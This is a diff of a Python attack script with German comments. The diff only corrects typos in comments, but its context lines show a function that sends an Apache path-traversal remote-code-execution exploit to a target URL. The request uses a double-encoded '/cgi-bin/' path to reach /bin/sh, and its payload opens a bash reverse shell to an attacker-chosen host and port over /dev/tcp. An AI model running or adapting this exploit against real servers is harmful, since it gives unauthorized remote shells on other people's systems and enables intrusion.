@@ -4,8 +4,8 @@ import requests
 import time
 
 def fire_exploit(target_url, lhost, lport):
-    """Sendet den Apache RCE Exploit, während der Listener bereits wartet."""
-    # Warten damit Socke-Listner sicher ready ist
+    """Sendet den Apache RCE-Exploit, während der Listener bereits wartet."""
+    # Warten damit Socket-Listener sicher ready ist
     time.sleep(1)
     
     print(f"[*] Sende Exploit 'POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1 \n echo Content-Type: text/plain; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'' an {target_url} ...")
@@ -19,7 +19,7 @@ def fire_exploit(target_url, lhost, lport):
         prepared.url = url 
         
         s = requests.Session()
-        # Timeout von 3 Sek ist wichtig, da die Reverse Shell den Request "hängen" lässt
+        # Timeout von 3 Sekunden ist wichtig, da die Reverse Shell den Request "hängen" lässt
         s.send(prepared, timeout=3)
     except requests.exceptions.ReadTimeout:
         pass
